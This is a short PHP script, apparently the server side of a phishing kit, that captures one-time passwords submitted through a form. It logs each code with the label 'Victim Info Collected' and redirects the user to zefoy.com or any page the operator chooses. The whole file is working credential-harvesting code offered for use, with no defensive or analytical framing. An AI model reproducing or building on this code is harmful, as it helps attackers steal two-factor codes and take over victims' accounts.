<?php
// verify_otp.php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Capture OTP from the form submission
    $otp = $_POST['otp'];

    // Log the collected OTP to the terminal
    error_log("Victim Info Collected: OTP: " . $otp);

    // Redirect to a "zefoy.com" page or wherever you'd like to take the victim after OTP
    header("Location: zefoy.com"); // You can replace this with any desired page
    exit();
}
?>
